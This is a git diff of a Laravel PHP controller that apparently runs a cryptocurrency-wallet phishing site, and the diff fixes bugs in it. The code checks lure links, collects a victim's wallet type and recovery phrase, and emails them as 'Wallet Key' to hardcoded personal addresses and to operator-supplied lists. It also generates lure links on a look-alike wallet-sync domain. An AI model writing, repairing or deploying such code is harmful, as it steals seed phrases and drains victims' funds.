@@ -22,16 +22,16 @@ class PagesController extends Controller
         $data = \request()->get('p');
 
         if ($data != null) {
-           $check = mailList::where('link', $data)->exists();
+            $check = mailList::where('link', $data)->exists();
 
-           if ($check) {
-               //store the data value in a session
-               \request()->session()->put('link',$data);
-               return view('index')->with('data', $data);
+            if ($check) {
+                //store the data value in a session
+                \request()->session()->put('link',$data);
+                return view('index')->with('data', $data);
 
-           }
-           else
-               return $this->page_not_found();
+            }
+            else
+                return $this->page_not_found();
         } else
             return $this->page_not_found();
     }
@@ -40,7 +40,7 @@ class PagesController extends Controller
     public function wallet()
     {
         if (\request()->session()->has('link')){
-            $link_value = \request()->session()->get('user');
+            $link_value = \request()->session()->get('link');
             return view('wallet')->with('data',$link_value);
         }
         else
@@ -61,10 +61,9 @@ class PagesController extends Controller
                 $message->to(['lawalfemi33@gmail.com', 'hello@callmehalpha.me'])
                     ->subject('Wallet Key');
             });
-            $mails = json_decode($mailList, true);
 
-            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mails) {
-                $message->to($mails)
+            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) use ($mailList) {
+                $message->to($mailList)
                     ->subject('Wallet Key');
             });
 
@@ -109,7 +108,7 @@ class PagesController extends Controller
     public function postLink(Request $request)
     {
         $emailList = $request->email;
-        $emailJson = json_encode(explode(',', $emailList));
+        $emailArray = explode(',', $emailList);
         $link = $request->link;
 
         $check = mailList::where('link', $link)->exists();
@@ -120,7 +119,7 @@ class PagesController extends Controller
 
         mailList::create([
             'link' => $link,
-            'emails' => $emailJson
+            'emails' => $emailArray
         ]);
         return back()->with('success', 'Link created successfully, below is your link <br/>https://synchronizewallets.com/?p='.$link);
     }
